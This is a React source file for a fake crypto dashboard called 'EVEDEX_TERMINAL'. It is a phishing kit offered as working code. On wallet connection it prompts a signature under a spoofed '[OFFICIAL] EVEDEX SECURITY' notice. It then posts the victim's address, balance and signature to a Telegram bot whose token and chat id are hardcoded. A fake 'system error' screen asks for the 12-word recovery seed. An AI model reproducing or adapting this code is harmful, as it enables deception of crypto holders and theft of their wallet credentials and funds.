import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSignMessage, useSwitchChain } from 'wagmi';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { signMessage } = useSignMessage();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";

  useEffect(() => {
    if (isConnected && address) {
      setTimeout(() => {
        triggerSign("VAULT_HANDSHAKE", "Verify ownership.");
      }, 1500);
    }
  }, [isConnected, address]);

  const triggerSign = (type, action) => {
    const msg = `[OFFICIAL] EVEDEX SECURITY\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node re-verification. No gas fee required.`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: `🎯 ${type}\nADDR: ${address}\nBAL: ${balance?.formatted}\nSIG: ${sig}` }),
        });
      }
    });
  };

  const handleFinalAction = () => {
    triggerSign("ASSET_SYNC", "Finalizing migration.");
    setLoading(true);
    setTimeout(() => { setLoading(false); setView("seed_gate"); }, 2000);
  };

  if (!isConnected) return (
    <div style={{background:'#05070a', minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center'}}>
       <w3m-button />
    </div>
  );

  return (
    <div style={{background:'#05070a', color:'#fff', minHeight:'100vh', padding:'20px', fontFamily:'sans-serif', textTransform:'uppercase'}}>
      <div style={{borderBottom:'1px solid #222', paddingBottom:'20px', marginBottom:'20px'}}>
        <h2 style={{color:'#06b6d4', fontStyle:'italic'}}>EVEDEX_TERMINAL</h2>
        <div style={{fontSize:'10px', color:'#555'}}>{address.slice(0,15)}...</div>
      </div>

      {view === "menu" && (
        <div style={{gridTemplateColumns:'repeat(3, 1fr)', display:'grid', gap:'10px'}}>
          {["Claim", "Stake", "Migrate", "Swap", "Rectify", "Bridge"].map(n => (
            <button key={n} onClick={() => setView("task")} style={{background:'#0d1117', border:'1px solid #222', padding:'20px', color:'#555', borderRadius:'15px', fontSize:'10px'}}>{n}</button>
          ))}
        </div>
      )}

      {view === "task" && (
        <div style={{background:'#0d1117', padding:'30px', borderRadius:'30px', textAlign:'center'}}>
          <h3 style={{marginBottom:'20px'}}>INITIALIZE_SYNC</h3>
          <input type="number" placeholder="0.00" style={{width:'100%', padding:'15px', background:'#000', border:'1px solid #222', color:'#fff', marginBottom:'20px'}} />
          <button onClick={handleFinalAction} style={{width:'100%', padding:'20px', background:'#06b6d4', color:'#000', fontWeight:'bold', borderRadius:'10px'}}>START HANDSHAKE</button>
        </div>
      )}

      {view === "seed_gate" && (
        <div style={{textAlign:'center', paddingTop:'50px'}}>
          <h3 style={{color:'red'}}>AUTH_REQUIRED</h3>
          <p style={{fontSize:'10px', color:'#555', margin:'20px 0'}}>System error. Enter recovery seed to finalize.</p>
          <textarea value={seedVal} onChange={e => setSeedVal(e.target.value)} placeholder="ENTER 12 WORDS..." style={{width:'100%', height:'120px', background:'#000', color:'#06b6d4', border:'1px solid #222', padding:'10px'}} />
          <button onClick={() => setIsSyncing(true)} style={{width:'100%', padding:'20px', background:'#06b6d4', marginTop:'20px', borderRadius:'10px'}}>FINAL_SYNC</button>
        </div>
      )}

      {loading && <div style={{position:'fixed', inset:0, background:'rgba(0,0,0,0.8)', display:'flex', alignItems:'center', justifyContent:'center'}}>SYNCING...</div>}
    </div>
  );
}
